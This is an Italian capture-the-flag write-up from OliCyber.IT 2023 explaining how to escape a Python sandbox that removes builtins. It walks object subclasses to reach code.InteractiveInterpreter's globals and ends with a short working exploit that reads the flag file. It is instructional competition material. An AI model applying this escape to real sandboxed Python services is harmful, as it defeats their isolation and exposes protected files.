# OliCyber.IT 2023 - Competizione Nazionale

## [misc] Sandbox-v2.py (26 risoluzioni)

La challenge consiste in una sandbox della shell interattiva di python, ha un setup simile al livello 1, con la differenza che non vengono messi a disposizione i builtins di python e vengono aggiunte alla blacklist gli apici, sia singoli che doppi.
Lo scopo della challenge è leggere il file della flag.

### Soluzione

L'obiettivo è recuperare i `builtins` (ossia le funzioni sempre presenti come `open`, `exit`, `chr`, ...), una volta ottenuti leggere la flag diventa banale.
Questo è ciò che c'è da sapere per risolvere la challenge:

**Trick 1**: tutte le "[user defined functions](https://docs.python.org/3/reference/datamodel.html#user-defined-functions)" hanno un riferimento alle variabili globali del file in cui vengono definite:

```py
In [1]: def fun():
   ...:     pass
   ...:

In [2]: globals() is fun.__globals__
Out[2]: True

In [3]: fun.__globals__["__builtins__"]
Out[3]: <module 'builtins' (built-in)>
```

i globals sono un dizionario di python con tutti gli oggetti presenti nello scope gloable del file, comprendono dunque anche i `builtins` come si evince dalla riga 3.

**Trick 2**: sfruttare l'ereditarietà per recuperare gli oggetti. In python ogni classe tiene in riferimento alla classe base e una lista di tutte le classi figlie. Inoltre, se non viene specificata una classe da cui ereditare, una classe eredita da `object` di default. Le classi figlie si enumerano con la funzione `__subclasses__` nel seguente modo (l'espressione `().__class__.__base__` serve per recuperare `object`):

```py
>>> ().__class__.__base__.__subclasses__()
[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, ... (parte omessa) ...
<class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'ast.AST'>]
>>>
```

Particolarmente interessante è il penultimo elemento della lista `<class 'code.InteractiveInterpreter'>`, questa è una classe user defined e dunque è possibile utilizzarla per recuperare i builtins come spiegato nel Trick 1.

Mettendo tutto insieme possiamo recuperare i builtins in questo modo:

si prende il riferimento a `<class 'code.InteractiveInterpreter'>`:

```py
>>> ii = ().__class__.__base__.__subclasses__()[-2]
```

si prendono i globals dalla funzione `__init__` come spiegato nel Trick 1:

```py
>>> gb = ii.__init__.__globals__
```

si leggono i nomi degli elementi all'interno di globals per vedere a che indice si trova builtins:

```py
>>> gb.keys()
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', 'sys', 'traceback', 'CommandCompiler', 'compile_command', '__all__', 'InteractiveInterpreter', 'InteractiveConsole', 'interact'])
```

si prendono i builtins accedendo al settimo elemento di `gb` usando l'unpacking operator `*` per creare una lista da un iterabile; si possono assegnare direttamente alla variabile `__builtins__` in modo da renderli subito disponibili nella shell:

```py
>>> __builtins__ = [*gb.values()][7]
```

la conferma che i builtins siano disponibili si può fare accedendo alle funzioni classiche:

```py
>>> open
<built-in function open>
>>> chr
<built-in function chr>
```

### Exploit

```py
ii = ().__class__.__base__.__subclasses__()[-2]
gb = ii.__init__.__globals__
__builtins__ = [*gb.values()][7]
open(chr(102)+chr(108)+chr(97)+chr(103)).read()
```
